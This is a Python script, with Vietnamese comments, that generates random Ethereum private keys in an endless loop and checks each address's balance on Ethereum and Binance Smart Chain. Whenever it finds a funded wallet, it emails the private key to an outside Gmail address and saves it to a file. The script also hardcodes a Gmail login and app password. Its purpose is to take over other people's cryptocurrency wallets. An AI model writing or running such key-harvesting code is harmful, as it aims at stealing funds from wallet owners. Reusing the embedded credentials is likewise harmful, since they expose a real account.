from web3 import Web3
from web3.auto import w3
import os

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


SENDER_EMAIL = "webchat6969@gmail.com"
SENDER_PASSWORD = "fxvn uepm wsqe pqmw"


def send_email(sender_email, sender_password, receiver_email, subject, message):
    msg = MIMEMultipart()
    msg["From"] = sender_email
    msg["To"] = receiver_email
    msg["Subject"] = subject
    msg.attach(MIMEText(message, "plain"))
    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(sender_email, sender_password)
        server.send_message(msg)


public_rpc_url_eth = "https://eth-pokt.nodies.app"
web3eth = Web3(Web3.HTTPProvider(public_rpc_url_eth))


public_rpc_url_bsc = "https://koge-rpc-bsc.48.club"
web3bsc = Web3(Web3.HTTPProvider(public_rpc_url_bsc))

# Kiểm tra kết nối thành công
if web3eth.is_connected():
    print("Connected to Ethereum network")

elif web3bsc.is_connected():
    print("Connected to Binance Smart Chain network")
    web3 = web3bsc


else:
    print("Failed to connect to Ethereum network")
    exit(1)
while True:
    # Tạo private key ngẫu nhiên
    account = w3.eth.account.create()

    # Lấy private key
    private_key = account.key

    # Địa chỉ ví Ethereum được tạo từ private key
    address = account.address

    # Lấy số dư và chuyển đổi sang Wei
    balance = web3eth.eth.get_balance(address)
    print("Private key: ", private_key.hex())
    print(f"Số dư của địa chỉ {address} ở eth là: {balance} Wei")

    balance2 = web3bsc.eth.get_balance(address)
    print(f"Số dư của địa chỉ {address} ở bnb là: {balance2} Wei")
    print("--------------------------------------------------")

    # Gửi email nếu số dư lớn hơn 0
    if balance > 0 or balance2 > 0:
        send_email(
            SENDER_EMAIL,
            SENDER_PASSWORD,
            "huy8bit@gmail.com",
            "Wallet balance",
            f"Address: {address}, Balance: {balance} Wei, Private Key: {private_key.hex()}",
        )

    # Lưu vào file nếu số dư lớn hơn 0
    if balance > 0 or balance2 > 0:
        with open("data.txt", "a") as file:
            file.write(
                f"Address: {address}, Balance: {balance} Wei, Private Key: {private_key.hex()}\n"
            )
